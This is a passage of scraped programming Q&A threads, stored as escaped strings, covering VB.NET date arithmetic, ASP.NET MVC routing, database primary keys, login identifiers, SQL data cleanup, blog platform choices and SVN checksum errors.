SQL plans  \\nHighlights variables declarations while they are used.  \\nTable definition on mouse hover.  \\n\\n\\nAll these features have saved me lot of time.\\n', 'How about Embarcadero Rapid SQL Really good but kind of expensive.\\n'], ['I have a situation where I want to add hours to a date and have the new date wrap around the work-day. I cobbled up a function to determine this new date, but want to make sure that I\\'m not forgetting anything.\\n\\nThe hours to be added is called \"delay\". It could easily be a parameter to the function instead.\\n\\nPlease post any suggestions. [VB.NET Warning]\\n\\nPrivate Function GetDateRequired() As Date\\n    \\'\\'// A decimal representation of the current hour\\n    Dim hours As Decimal = Decimal.Parse(Date.Now.Hour) + (Decimal.Parse(Date.Now.Minute) / 60.0) \\n\\n    Dim delay As Decimal = 3.0           \\'\\'// delay in hours\\n    Dim endOfDay As Decimal = 12.0 + 5.0 \\'\\'// end of day, in hours\\n    Dim startOfDay As Decimal = 8.0      \\'\\'// start of day, in hours\\n\\n    Dim newHour As Integer\\n    Dim newMinute As Integer\\n\\n    Dim dateRequired As Date = Now\\n    Dim delta As Decimal = hours + delay\\n\\n    \\'\\'// Wrap around to the next day, if necessary\\n    If delta &gt; endOfDay Then\\n        delta = delta - endOfDay\\n        dateRequired = dateRequired.AddDays(1)\\n\\n        newHour = Integer.Parse(Decimal.Truncate(delta))\\n        newMinute = Integer.Parse(Decimal.Truncate((delta - newHour) * 60))\\n        newHour = startOfDay + newHour\\n    Else\\n        newHour = Integer.Parse(Decimal.Truncate(delta))\\n        newMinute = Integer.Parse(Decimal.Truncate((delta - newHour) * 60))\\n    End If\\n\\n    dateRequired = New Date(dateRequired.Year, dateRequired.Month, dateRequired.Day, newHour, newMinute, 0)\\n\\n    Return dateRequired\\nEnd Sub\\n\\n\\nNote: This will probably not work if delay is more than 9 hours long. It should never change from 3, through.\\n\\nEDIT:\\nThe goal is find the date and time that you get as a result of adding several hours to the current time. This is used to determine a default value for a due date of a submission. I want to add 3 hours to the current time to get the due date time. However, I don\\'t want due dates that go beyond 5pm on the current day. So, I tried to have the hours split between (today, up to 5pm) and (tomorrow, from 8am on), such that adding 3 hours to 4pm would give you 19am, because 1 hour is added to the end of today and 2 hours are added to the beginning of tomorrow.\\n', 'You should probably write some automated tests for each condition you can think of, and then just start brainstorming more, writing the tests as you think of them.  This way, you can see for sure it will work, and will continue to work if you make further changes.  Look up Test Driven Development if you like the results.', 'Okay, how about these? The difference between the approaches should speak for themselves.\\r\\nAlso, this is tested about as far as I can throw it. The warranty lasts until... now.\\r\\nHope it helps!Module Module1\\r\\n\\r\\n    Public Function IsInBusinessHours(ByVal d As Date) As Boolean\\r\\n        Return Not (d.Hour &lt; 8 OrElse d.Hour &gt; 17 OrElse d.DayOfWeek = DayOfWeek.Saturday OrElse d.DayOfWeek = DayOfWeek.Sunday)\\r\\n    End Function\\r\\n\\r\\n\\r\\n    Public Function AddInBusinessHours(ByVal fromDate As Date, ByVal hours As Integer) As Date\\r\\n        Dim work As Date = fromDate.AddHours(hours)\\r\\n        While Not IsInBusinessHours(work)\\r\\n            work = work.AddHours(1)\\r\\n        End While\\r\\n        Return work\\r\\n    End Function\\r\\n\\r\\n\\r\\n    Public Function LoopInBusinessHours(ByVal fromDate As Date, ByVal hours As Integer) As Date\\r\\n        Dim work As Date = fromDate\\r\\n        While hours &gt; 0\\r\\n            While hours &gt; 0 AndAlso IsInBusinessHours(work)\\r\\n                work = work.AddHours(1)\\r\\n                hours -= 1\\r\\n            End While\\r\\n            While Not IsInBusinessHours(work)\\r\\n                work = work.AddHours(1)\\r\\n            End While\\r\\n        End While\\r\\n        Return work\\r\\n    End Function\\r\\n\\r\\n    Sub Main()\\r\\n        Dim test As Date = New Date(2008, 8, 8, 15, 0, 0)\\r\\n        Dim hours As Integer = 5\\r\\n        Console.WriteLine(\"Date: \" + test.ToString() + \", \" + hours.ToString())\\r\\n        Console.WriteLine(\"Just skipping: \" + AddInBusinessHours(test, hours))\\r\\n        Console.WriteLine(\"Looping: \" + LoopInBusinessHours(test, hours))\\r\\n        Console.ReadLine()\\r\\n    End Sub\\r\\n\\r\\nEnd Module\\r\\n', \"I've worked with the following formula (pseudocode) with some success:now &lt;- number of minutes since the work day starteddelay &lt;- number of minutes in the delayday &lt;- length of a work day in minutesx &lt;- (now + delay) / day {integer division}y &lt;- (now + delay) % day {modulo remainder}return startoftoday + x {in days} + y {in minutes}\"], [\"The company I work for is wanting to add blog functionality to our website and they were looking to spend an awful amount of money to have some crap being built on top of a CMS they purchased (sitecore).  I pointed them to Telligent's Community Server and  we had a sales like meeting today to get the Marketing folks on board. \\r\\nMy question is if anyone has had issues working with Community Server, skinning it and extending it?\\r\\nI wanted to explain a bit why I am thinking Community Server, the company is wanting multiple blogs with multiple authors.  I want to be out of the admin part of this as much as possible and didn't think there were too many engines that having multiple blogs didn't mean db work.  I also like the other functionality that Community Server provides and think the company will find it useful, particularly the media section as right now we have some really shotty way of dealing with whitepapers and stuff.\\r\\n\\r\\nedit: We are actually using the Sitecore blog module for a single blog on our intranet (which is actually what the CMS is serving).  Some reasoning for why I don't like it for our public site are they are on different servers, it doesn't support multiple authors, there is no built in syndication, it is a little flimsy feeling to me from looking at the source and I personally think the other features of Community Server make its price tag worth it.\\r\\n\\r\\nanother edit: Need to stick to .net software that run on sql server in my company's case, but I don't mind seeing recommendations for others.  ExpressionEngine looks promising, will try it out on my personal box.\", \"I've done quite a few projects using Community Server. If you're okay with the out-of-the-box functionality, or you don't mind sticking to the version you start with, I think you'll be very happy.\\r\\n\\r\\nThe times I've run into headaches using CS is when the client wants functionality CS does not provide, but also insists on keeping the ability to upgrade to the latest version whenever Telligent releases an update. You can mostly support that by making all of your changes either in a separate project or by only modifying aspx/ascx files (no codebehinds). Some kind of merge is going to be required though no matter how well you plan it out.\", 'Community Server itself has been very solid for me, but if all you need is a blogging engine then it may be overkill. Skinning it, for example, is quite a bit of work (despite their quite powerful Chameleon theme engine).\\r\\nI\\'d probably look closer at one of the dedicated blog engines out there, like BlogEngine.NET, dasBlog or SubText, if that\\'s all you need. Go with Community Server if you think you\\'ll want more \"community-focused\" features like forums etc.', 'Have you had a look at the Shared Source blog module for Sitecore?\\n', 'Expression Engine with the Multi-Site Manager works great for that kind of situation.', \"You can also take a look at Telligent Graffiti CMS.\\nhttp://graffiticms.com/\\n\\nIt supports multiple blogs and authors.\\n\\nUpdate: It's now open source and available at http://graffiticms.codeplex.com/\\n\", \"Community Server 2008.5 lets you add several members that can post articles. Also with \\nCommunity Server 2008.5 you now have wiki's along with forums and the blogs. This probably has one of the better web based admin control panel's I seen in a while. This let's you easily change several things including the site's theme (or skin). To me it is one of the most scalable applications I have seen in a while. We are using it for our site http://knowledgemgmtsolutions.com.  \\n\", \"Sitecore's Forum module is powered by Community Server and integrated with Sitecore CMS.\\n\", \"Skinning is pretty straightforward, and the sidebar widgets aren't very difficult to create (if you don't mind building controls in code). The widgets also allow options for the users to customize them in the control panel very easily. I doubt you'll find a strong community of widget builders for Community Server however. Nothing compared to the dev community for blogs like wordpress.\\n\\nI recommend starting templates from scratch and adding in CS controls as needed, to get the markup you prefer for styling and to use only what you need.\\n\\nSetting up different roles for users to post to different blogs is also very easy and requires no coding. You can have blog groups, and allow only certain users to post to certain blogs.\\n\"], ['I have several tables whose only unique data is a uniqueidentifier (a Guid) column. Because guids are non-sequential (and they\\'re client-side generated so I can\\'t use newsequentialid()), I have made a non-primary, non-clustered index on this ID field rather than giving the tables a clustered primary key.\\n\\nI\\'m wondering what the performance implications are for this approach. I\\'ve seen some people suggest that tables should have an auto-incrementing (\"identity\") int as a clustered primary key even if it doesn\\'t have any meaning, as it means that the database engine itself can use that value to quickly look up a row instead of having to use a bookmark.\\n\\nMy database is merge-replicated across a bunch of servers, so I\\'ve shied away from identity int columns as they\\'re a bit hairy to get right in replication.\\n\\nWhat are your thoughts? Should tables have primary keys? Or is it ok to not have any clustered indexes if there are no sensible columns to index that way?\\n', \"I too have always heard having an auto-incrementing int is good for performance even if you don't actually use it.\", 'When dealing with indexes, you have to determine what your table is going to be used for.  If you are primarily inserting 1000 rows a second and not doing any querying, then a clustered index is a hit to performance.  If you are doing 1000 queries a second, then not having an index will lead to very bad performance.  The best thing to do when trying to tune queries/indexes is to use the Query Plan Analyzer and SQL Profiler in SQL Server.  This will show you where you are running into costly table scans or other performance blockers.\\r\\n\\r\\nAs for the GUID vs ID argument, you can find people online that swear by both.  I have always been taught to use GUIDs unless I have a really good reason not to.  Jeff has a good post that talks about the reasons for using GUIDs: http://www.codinghorror.com/blog/archives/000817.html.\\r\\n\\r\\nAs with most anything development related, if you are looking to improve performance there is not one, single right answer.  It really depends on what you are trying to accomplish and how you are implementing the solution.  The only true answer is to test, test, and test again against performance metrics to ensure that you are meeting your goals.\\r\\n\\r\\n[Edit]\\r\\n@Matt, after doing some more research on the GUID/ID debate I came across this post.  Like I mentioned before, there is not a true right or wrong answer.  It depends on your specific implementation needs.  But these are some pretty valid reasons to use GUIDs as the primary key:\\r\\n\\r\\n\\r\\n  For example, there is an issue known as a \"hotspot\", where certain pages of data in a table are under relatively high currency contention. Basically, what happens is most of the traffic on a table (and hence page-level locks) occurs on a small area of the table, towards the end. New records will always go to this hotspot, because IDENTITY is a sequential number generator. These inserts are troublesome because they require Exlusive page lock on the page they are added to (the hotspot). This effectively serializes all inserts to a table thanks to the page locking mechanism. NewID() on the other hand does not suffer from hotspots. Values generated using the NewID() function are only sequential for short bursts of inserts (where the function is being called very quickly, such as during a multi-row insert), which causes the inserted rows to spread randomly throughout the table\\'s data pages instead of all at the end - thus eliminating a hotspot from inserts.\\r\\n  \\r\\n  Also, because the inserts are randomly distributed, the chance of page splits is greatly reduced. While a page split here and there isnt too bad, the effects do add up quickly. With IDENTITY, page Fill Factor is pretty useless as a tuning mechanism and might as well be set to 100% - rows will never be inserted in any page but the last one. With NewID(), you can actually make use of Fill Factor as a performance-enabling tool. You can set Fill Factor to a level that approximates estimated volume growth between index rebuilds, and then schedule the rebuilds during off-peak hours using dbcc reindex. This effectively delays the performance hits of page splits until off-peak times.\\r\\n  \\r\\n  If you even think you might need to enable replication for the table in question - then you might as well make the PK a uniqueidentifier and flag the guid field as ROWGUIDCOL. Replication will require a uniquely valued guid field with this attribute, and it will add one if none exists. If a suitable field exists, then it will just use the one thats there.\\r\\n  \\r\\n  Yet another huge benefit for using GUIDs for PKs is the fact that the value is indeed guaranteed unique - not just among all values generated by this server, but all values generated by all computers - whether it be your db server, web server, app server, or client machine. Pretty much every modern language has the capability of generating a valid guid now - in .NET you can use System.Guid.NewGuid. This is VERY handy when dealing with cached master-detail datasets in particular. You dont have to employ crazy temporary keying schemes just to relate your records together before they are committed. You just fetch a perfectly valid new Guid from the operating system for each new record\\'s permanent key value at the time the record is created. \\r\\n  \\r\\n  http://forums.asp.net/t/264350.aspx\\r\\n', \"The primary key serves three purposes:\\r\\n\\r\\n\\r\\nindicates that the column(s) should be unique\\r\\nindicates that the column(s) should be non-null\\r\\ndocument the intent that this is the unique identifier of the row\\r\\n\\r\\n\\r\\nThe first two can be specified in lots of ways, as you have already done.\\r\\n\\r\\nThe third reason is good:\\r\\n\\r\\n\\r\\nfor humans, so they can easily see your intent\\r\\nfor the computer, so a program that might compare or otherwise process your table can query the database for the table's primary key.\\r\\n\\r\\n\\r\\nA primary key doesn't have to be an auto-incrementing number field, so I would say that it's a good idea to specify your guid column as the primary key.\", \"A Primary Key needn't be an autoincrementing field, in many cases this just means you are complicating your table structure.\\r\\n\\r\\nInstead, a Primary Key should be the minimum collection of attributes (note that most DBMS will allow a composite primary key) that uniquely identifies a tuple.\\r\\n\\r\\nIn technical terms, it should be the field that every other field in the tuple is fully functionally dependent upon.  (If it isn't you might need to normalise).\\r\\n\\r\\nIn practice, performance issues may mean that you merge tables, and use an incrementing field, but I seem to recall something about premature optimisation being evil...\", 'Just jumping in, because Matt\\'s baited me a bit.\\n\\nYou need to understand that although a clustered index is put on the primary key of a table by default, that the two concepts are separate and should be considered separately. A CIX indicates the way that the data is stored and referred to by NCIXs, whereas the PK provides a uniqueness for each row to satisfy the LOGICAL requirements of a table.\\n\\nA table without a CIX is just a Heap. A table without a PK is often considered \"not a table\". It\\'s best to get an understanding of both the PK and CIX concepts separately so that you can make sensible decisions in database design.\\n\\nRob\\n', 'Nobody answered actual question: what are pluses/minuses of a table with NO PK NOR a CLUSTERED index.\\nIn my opinion, if you optimize for faster inserts (especially incremental bulk-insert, e.g. when you bulk load data into a non-empty table), such a table: with NO clustered index, NO constraints, NO Foreign Keys, NO Defaults and NO Primary Key, in a database with Simple Recovery Model, is the best. Now, if you ever want to query this table (as opposed to scanning it in its entirety) you may want to add a non-clustered non-unique indexes as needed but keep them to the minimum.\\n', \"Since you are doing replication, your are correct identities are something to stear clear of. I would make your GUID a primary key but nonclustered since you can't use newsequentialid. That stikes me as your best course. If you don't make it a PK but put a unique index on it, sooner or later that may cause people who maintain the system to not understand the FK relationships properly introducing bugs.\\n\"], ['I have a route that I am calling through a RedirectToRoute like this:\\n\\nreturn this.RedirectToRoute(\"Super-SuperRoute\", new { year = selectedYear });\\n\\n\\nI have also tried:\\n\\n return this.RedirectToRoute(\"Super-SuperRoute\", new { controller = \"Super\", action = \"SuperRoute\", id = \"RouteTopic\", year = selectedYear });\\n\\n\\nThe route in the global.asax is like this:\\n\\nroutes.MapRoute(\\n    \"Super-SuperRoute\", // Route name\\n    \"Super.mvc/SuperRoute/{year}\",  // URL with parameters\\n     new { controller = \"Super\", action = \"SuperRoute\", id = \"RouteTopic\" }  // Parameter defaults\\n);\\n\\n\\nSo why do I get the error: \"No route in the route table matches the supplied values.\"?\\n\\nI saw that the type of selectedYear was var.  When I tried to convert to int with int.Parse I realised that selectedYear was actually null, which would explain the problems.  I guess next time I\\'ll pay more attention to the values of the variables at a breakpoint :)\\n', 'What type is selectedYear? A DateTime? If so then you might need to convert to a string.'], ['I\\'m pretty new to my company (2 weeks) and we\\'re starting a new platform for our system using .NET 3.5 Team Foundation from DotNetNuke. Our \"architect\" is suggesting we use one class project. Of course, I chime back with a \"3-tier\" architecture (Business, Data, Web class projects). \\r\\n\\r\\nIs there any disadvantages to using this architecture? Pro\\'s would be separation of code from data, keeping class objects away from your code, etc.', \"it tends to take an inexperienced team longer to build 3-tier.It's more code, so more bugs. I'm just playing the devil's advocate though.\", \"I guess a fairly big downside is that the extra volume of code that you have to write, manage and maintain for a small project may just be overkill.\\n\\nIt's all down to what's appropriate for the size of the project, the expected life of the final project and the budget!  Sometimes, whilst doing things 'properly' is appealing, doing something a little more 'lightweight' can be the right commercial decision!\\n\", 'I would be pushing hard for the N tiered approach even if it\\'s a small project. If you use an ORM tool like codesmith + nettiers you will be able to quickly setup the projects and be developing code that solves your business problems quickly.\\r\\nIt kills me when you start a new project and you spend days sitting around spinning wheels talking about how the \"architecture\" should be architected. You want to be spending time solving the business problem, not solving problems that other people have solved for you. Using an ORM (it doesn\\'t really matter which one, just pick one and stick to it) to help you get initial traction will help keep you focussed on the goals of the project and not distract you trying to solve \"architecture\" issues.\\r\\nIf, at the end of the day, the architect wants to go the one project approach, there is no reason you can\\'t create an app_code folder with a BLL and DAL folder to seperate the code for now which will help you move to an N-Tiered solution later.', 'As with anything abstraction creates complexity, and so the complexity of doing N-tiered should be properly justified, e.g., does N-tiered actually benefit the system? There will be small systems that will work best with N-tiered, although a lot of them will not.\\r\\n\\r\\nAlso, even if your system is small at the moment, you might want to add more features to it later -- not going N-tiered might consitute a sort of technical debt on your part, so you have to be careful.', 'Because you want the capability of being able to distribute the layers onto different physical tiers (I always use \"tier\" for physical, and \"layer\" for logical), you should think twice before just putting everything into one class because you\\'ve got major refactorings to do if or when you do need to start distributing.\\n', \"The only disadvantage is complexity but really how hard is it to add some domain objects and bind to a list of them as opposed to using a dataset.  You don't even have to create three seperate projects, you can just create 3 seperate folders within the web app and give each one a namespace like, YourCompany.YourApp.Domain, YourCompany.YourApp.Data, etc.  \\n\\nThe big advantage is having a more flexible solution.  If you start writing your app as a data centric application, strongly coupling your web forms pages to datasets, you are going to end up doing a lot more work later migrating to a more domain centeric model as your business logic grows in complexity.  \\n\\nMaybe in the short term you focus on a simple solution by creating very simple domain objects and populating them from datasets, then you can add business logic to them as needed and build out a more sophisticated ORM as needed, or use nhibernate.\\n\"], ['We are in the early design stages of a major rewrite of our product. Right now our customers are mostly businesses. We manage accounts. User names for an account are each on their own namespace but it means that we can\\'t move assets between servers.\\r\\n\\r\\nWe want to move to a single namespace. But that brings the problem of unique user names.\\r\\n\\r\\nSo what\\'s the best idea?\\r\\n\\r\\n\\r\\nEmail address (w/verification) ?\\r\\nUnique alpha-numeric string (\"johnsmith9234\")?\\r\\nShould we look at OpenID?\\r\\n', \"OpenID seems to be a very good alternative to writing your own user management/authentication piece.  I'm seeing more and more sites using OpenID these days, so the barrier to entry for your users should be relatively low.\", \"I like OpenID, but I'd still go with the email address, unless your user community is very technically savvy. It's still much easier for most people to understand and remember.\", \"EMAIL ADDRESS\\r\\n\\r\\nRational\\r\\n\\r\\n\\r\\nUsers don't change emails very often\\r\\nRemoves the step of asking for username and email address, which you'll need anyway\\r\\nUsers don't often forget their email address (see number one)\\r\\nEmail will be unique unless the user already registered for the site, in which case forward them to a forgot your password screen\\r\\nAlmost everyone is using email as the primary login for access to a website, this means the rate of adoption shouldn't be affected by the fact that you're asking for an email address\\r\\n\\r\\n\\r\\n\\r\\n\\r\\nUpdate\\r\\n\\r\\nAfter registration, be sure to ask the user to create some kind of username, don't litter a public site with their email address! Also, another benefit of using an email address as a login: you won't need any other information (like password / password confirm), just send them a temp password through the mail, or forgo passwords altogether and send them a one-use URL to their email address every time they'd like to login (see: mugshot.org)\", \"I personally would say Email w/ Verification, OpenId is a great idea but I find that finding a provider that your already with is a pain, I only had an openId for here cause just 2 days before beta i decided to start a blog on blogspot. But everyone on the internet has en email address, especially when dealing with businesses, people aren't very opt to using there personal blog or whatnot for a business login.\", \"I think that OpenID is definitely worth looking at.  Besides giving you a framework in which to provide a unified id for customers, it can also provide large businesses with the ability to manage their own logins and provide a common login across all products that they use, including your own.  This isn't that large of a benefit now when OpenId is still relatively rare, but as more products begin to use it, I suspect that the ability to use a common company OpenId login for each employee could become a good selling point.\\r\\n\\r\\nSince you're mostly catering to businesses, I don't think that it's all that unreasonable to offer to host the OpenId accounts yourself.  I just think that the extra flexibility will benefit your customers.\", \"OpenID is very slick, and something you should seriously consider as it basically removes the requirement to save local usernames and passwords and worry about authentication.\\r\\n\\r\\nA lot of sites nowadays are using both OpenID and their own, giving users the option.\\r\\n\\r\\nIf you do decide to roll your own, I'd recommend using the email address. Be careful, though, if you are creating something that groups users by an account (say, a company that has several users). In this case, the email address might be used more than once (if they do work for more than one company, for example), and you should allow that.\\r\\n\\r\\nHTH!\", \"If most of your customers are mostly businesses then I think that using anything other than email creates problems for your customers. Most people are comfortable with email address login and since they are a business customer will likely want to use their work email rather than a personal account. OpenID creates a situation where there is a third party involved and many businesses don't like a third party involved.\", 'Using OpenID seems like a particularly bad idea, it has serious security problems, and a fair amount of other issues too.\\n\\nSee: http://idcorner.org/2007/08/22/the-problems-with-openid/\\n', \"If you use an email address for ID, don't require that it be verified. I learned the hard way about this when one day suddenly the number of signups at my site drastically decreased. It turns out that the entire range of IP addresses including my site's IP was blacklisted. It took a long time to resolve it. In other cases, I have seen Gmail marking very legitimate emails as spam, and that can cause trouble too.\\n\\nIt's good to verify the email address, but don't make it block signups.\\n\", '\\n  Right now our customers are mostly businesses.\\n\\n\\nPeople seem to be missing that line. If it\\'s for a business, requiring them to login via OpenID really isn\\'t very practical. They\\'d either have to use an external OpenID provider, or their poor tech people would have to setup and configure a company OpenID.\\n\\nIf this were \"should StackOverflow require OpenID for login\" or \"Should my blog-comment-system allow you to identify yourself via OpenID\", my answer would be \"absolutely!\", but in this case, I don\\'t think OpenID would be a good fit.\\n', 'If you are looking at OpenID you should check out http://eaut.org/ and http://emailtoid.net.  Basically you can accept email addresses for a login and behind the scenes translate them to OpenID without the user having to know anything.  Its pretty slick stuff...\\n'], ['I\\'ve been handed a table with about 18000 rows. Each record describes the location of one customer. The issue is, that when the person created the table, they did not add a field for \"Company Name\", only \"Location Name,\" and one company can have many locations.\\n\\nFor example, here are some records that describe the same customer:\\n\\nLocation Table\\n\\n ID  Location_Name     \\n 1   TownShop#1        \\n 2   Town Shop - Loc 2 \\n 3   The Town Shop     \\n 4   TTS - Someplace   \\n 5   Town Shop,the 3   \\n 6   Toen Shop4        \\n\\n\\nMy goal is to make it look like:\\n\\nLocation Table\\n\\n ID  Company_ID   Location_Name     \\n 1   1            Town Shop#1       \\n 2   1            Town Shop - Loc 2 \\n 3   1            The Town Shop     \\n 4   1            TTS - Someplace   \\n 5   1            Town Shop,the 3   \\n 6   1            Toen Shop4        \\n\\n\\nCompany Table\\n\\n Company_ID  Company_Name  \\n 1           The Town Shop \\n\\n\\nThere is no \"Company\" table, I will have to generate the Company Name list from the most descriptive or best Location Name that represents the multiple locations.\\n\\nCurrently I am thinking I need to generate a list of Location Names that are similar, and then and go through that list by hand.\\n\\nAny suggestions on how I can approach this is appreciated.\\n\\n@Neall, Thank you for your statement, but unfortunately, each location name is distinct, there are no duplicate location names, only similar. So in the results from your statement \"repcount\" is 1 in each row.\\n\\n@yukondude, Your step 4 is the heart of my question.\\n', 'I\\'ve had to do this before. The only real way to do it is to manually match up the various locations. Use your database\\'s console interface and grouping select statements. First, add your \"Company Name\" field. Then:\\r\\n\\r\\nSELECT count(*) AS repcount, \"Location Name\" FROM mytable WHERE \"Company Name\" IS NULL GROUP BY \"Location Name\" ORDER BY repcount DESC LIMIT 5;\\r\\n\\r\\nFigure out what company the location at the top of the list belongs to and then update your company name field with an UPDATE ... WHERE \"Location Name\" = \"The Location\" statement.\\r\\n\\r\\nP.S. - You should really break your company names and location names out into separate tables and refer to them by their primary keys.\\r\\n\\r\\nUpdate: - Wow - no duplicates? How many records do you have?', \"Please update the question, do you have a list of CompanyNames available to you? I ask because you maybe able to use Levenshtein algo to find a relationship between your list of CompanyNames and LocationNames.\\r\\n\\r\\n\\r\\n\\r\\nUpdate\\r\\n\\r\\n\\r\\n  There is not a list of Company Names, I will have to generate the company name from the most descriptive or best Location Name that represents the multiple locations.\\r\\n\\r\\n\\r\\nOkay... try this:\\r\\n\\r\\n\\r\\nBuild a list of candidate CompanyNames by finding LocationNames made up of mostly or all alphabetic characters. You can use regular expressions for this. Store this list in a separate table.\\r\\nSort that list alphabetically and (manually) determine which entries should be CompanyNames.\\r\\nCompare each CompanyName to each LocationName and come up with a match score (use Levenshtein or some other string matching algo). Store the result in a separate table.\\r\\nSet a threshold score such that any MatchScore &lt; Threshold will not be considered a match for a given CompanyName.\\r\\nManually vet through the LocationNames by CompanyName | LocationName | MatchScore, and figure out which ones actually match. Ordering by MatchScore should make the process less painful.\\r\\n\\r\\n\\r\\nThe whole purpose of the above actions is to automate parts and limit the scope of your problem. It's far from perfect, but will hopefully save you the trouble of going through 18K records by hand.\", \"I was going to recommend some complicated token matching algorithm but it's really tricky to get right and if you're data does not have a lot of correlation (typos, etc) then it's not going to give very good results.\\r\\n\\r\\nI would recommend you submit a job to the Amazon Mechanical Turk and let a human sort it out.\", 'Ideally, you\\'d probably want a separate table named Company and then a company_id column in this \"Location\" table that is a foreign key to the Company table\\'s primary key, likely called id. That would avoid a fair bit of text duplication in this table (over 18,000 rows, an integer foreign key would save quite a bit of space over a varchar column).\\r\\n\\r\\nBut you\\'re still faced with a method for loading that Company table and then properly associating it with the rows in Location. There\\'s no general solution, but you could do something along these lines:\\r\\n\\r\\n\\r\\nCreate the Company table, with an id column that auto-increments (depends on your RDBMS).\\r\\nFind all of the unique company names and insert them into Company.\\r\\nAdd a column, company_id, to Location that accepts NULLs (for now) and that is a foreign key of the Company.id column.\\r\\nFor each row in Location, determine the corresponding company, and UPDATE that row\\'s company_id column with that company\\'s id. This is likely the most challenging step. If your data is like what you show in the example, you\\'ll likely have to take many runs at this with various string matching approaches.\\r\\nOnce all rows in Location have a company_id value, then you can ALTER the Company table to add a NOT NULL constraint to the company_id column (assuming that every location must have a company, which seems reasonable).\\r\\n\\r\\n\\r\\nIf you can make a copy of your Location table, you can gradually build up a series of SQL statements to populate the company_id foreign key. If you make a mistake, you can just start over and rerun the script up to the point of failure.', \"Yes, that step 4 from my previous post is a doozy.\\r\\n\\r\\nNo matter what, you're probably going to have to do some of this by hand, but you may be able to automate the bulk of it. For the example locations you gave, a query like the following would set the appropriate company_id value:\\r\\n\\r\\nUPDATE  LocationSET     Company_ID = 1WHERE   (LOWER(Location_Name) LIKE '%to_n shop%'OR      LOWER(Location_Name) LIKE '%tts%')AND     Company_ID IS NULL;\\r\\n\\r\\nI believe that would match your examples (I added the IS NULL part to not overwrite previously set Company_ID values), but of course in 18,000 rows you're going to have to be pretty inventive to handle the various combinations.\\r\\n\\r\\nSomething else that might help would be to use the names in Company to generate queries like the one above. You could do something like the following (in MySQL):\\r\\n\\r\\nSELECT  CONCAT('UPDATE Location SET Company_ID = ',        Company_ID, ' WHERE LOWER(Location_Name) LIKE ',        LOWER(REPLACE(Company_Name), ' ', '%'), ' AND Company_ID IS NULL;')FROM    Company;\\r\\n\\r\\nThen just run the statements that it produces. That could do a lot of the grunge work for you.\"], [\"I'm using subclipse in Flex Builder 3, and recently received this error when trying to commit:\\n\\nsvn: Checksum mismatch for '/Users/redacted/Documents/Flex Builder 3/path/to/my/file.mxml'; expected: 'f8cb275de72776657406154dd3c10348', actual: 'null'\\n\\nI worked around it by:\\n\\n\\nCommitting all the other changed files, omitting the troublesome one.\\nCopying the contents of the trouble file to a TextMate window\\nDeleting my project in FlexBuilder/Eclipse\\nChecking my project out fresh from SVN\\nCopying the text of the trouble file back in from the TextMate Window\\nCommitting the changes.\\n\\n\\nIt worked, but I can't help but think there's a better way. What's actaully happening to cause the svn:checksum error, and what's the best fix.\\n\\nMaybe more important -- is this a symptom of a greater problem?\\n\", \"The file in the .svn directory that keeps track of what you have checked out, when, what revision, and from where, has gotten corrupted somehow, for that particular file.\\r\\n\\r\\nThis is no more dangerous or critical than the normal odd file problem, and can be because of various problems, like a subversion program dying mid-change, power-disruption, etc.\\r\\n\\r\\nUnless it happens more I wouldn't make much out of it.\\r\\n\\r\\nIt can be fixed by doing what you did, make a copy of your work-files, check out a fresh copy, and add the modified files back in.\\r\\n\\r\\nNote that this might cause problems if you have a busy project where you would normally have to merge in changes.\\r\\n\\r\\nFor instance, you and a collegue both check out a fresh copy, and start working on the same file. At some point, your collegue checks in his modifications. When you attempt to do the same, you get the checksum problem you have. If you now make copies of your changed files, do a fresh checkout, then subversion will lose track of how your changes should be merged back in.\\r\\n\\r\\nIf you didn't get the problem in this case, when you got around to checkin in your modifications, you would need to update your working copy first, and possibly handle a conflict with your file.\\r\\n\\r\\nHowever, if you do a fresh checkout, complete with your collegues changes, it now looks like you removed his changes and substituted with your own. No conflicts, and no indications from subversion that something is amiss.\", \"I occasionally get similar things, usually with files that nobody has been near in weeks. Generally, if you know you haven't been working in the directory in question, you can just delete the directory with the problem and run \\r\\n\\r\\nsvn update\\r\\n\\r\\nto recreate it.\\r\\n\\r\\nIf you have live changes in the directory then as lassevk and you yourself suggested, a more careful approach is required.\\r\\n\\r\\nGenerally speaking I would say it's a good idea not to leave edited files uncommitted, and keep the working copy tidy - don't add a whole bunch of extra files into the working copy that you aren't going to use. Commit regularly, and then if the working copy goes tits up, you can just delete the whole thing and start over without worrying about what you might or might not be losing, and without the pain of trying to figure out what files to save. \", \"Just today, I managed to recover from this error by checking out a copy of the corrupted directory to /tmp and replacing the files in .svn/text-base with the just co'ed ones. I wrote up the procedure in some detail here on my blog. I'd be interested to hear from more experienced SVN users what are the advantages and disadvantages of each approach.\\n\", \"SVN keeps pristine copies of all the files you checkout buried in the .svn directories.  This is called the text-base.  This allows for speedy diffs and reverts.  During various operations, SVN will do checksums on these text-base files to catch file corruption issues.\\n\\nIn general, an SVN checksum mismatch means a file that shouldn't have been altered was changed somehow.  What does that mean?\\n\\n\\nDisk corruption (bad HDD or IDE cable)\\nBad RAM\\nBad network link\\nSome kind of background process altered a file behind your back (malware)\\n\\n\\nAll of these are bad.\\n\\nHOWEVER, I think your problem is different.  Look at the error message.  Note that it expected some MD5 hashes, but instead got back 'null'.  If this were a simple file corruption issue, I would expect that you would have two different MD5 hashes for the expected/got.  The fact that you have a 'null' implies that something else is wrong.\\n\\nI have two theories:\\n\\n\\nBug in SVN.\\nSomething had an exclusive lock on the file, and the MD5 couldn't happen.\\n\\n\\nIn the case of #1, try upgrading to the latest SVN version.  Maybe also post this on the svn-devel mailing list (http://svn.haxx.se), so the developers can see it.\\n\\nIn the case of #2, check to see if anything has the file locked.  You can download a copy of Process Explorer to check.  Note that you probably want to see who has a lock on the text-base file, not the actual file you were trying to commit.\\n\", \"There's also a simpler cause for this  than just bugs, or disk corruption etc. I think it the most likely cause for this to happen is when someone writes a recursive text replacement on the working copy, without excluding .svn files.\\nThis means the pristine copies of the files (basically the BASE version of the files, that's stored inside the .svn administrative area) get modified, and that invalidates the MD5 sum.\\n\\n@Andrew Hedges: that also explains why your solution fixes this.  \\n\", 'try:\\nsvn up --force file.c\\n\\nThis worked for me without having to do anything extra\\n', 'Had this issue, our dev VM\\'s are all *nix our workstations win32.\\nsome fool(s) created files of the same name (different case) on the *nix box\\nall of a sudden checkouts on Win32 blows up... \\nbecause win doesn\\'t know which of the 2 files of the same name to MD5 against, \\ncheckouts on *nix were fine... leaving us to scratch our heads for a bit\\n\\nI was able to update the repo on the win box by copying the \".svn\" folders over from a *nix box with a good working copy. have yet to see if the repo can be cleaned to the point where we can do a full checkout again\\n', 'another, possibly even scarier, workaround for checksum conflicts i found 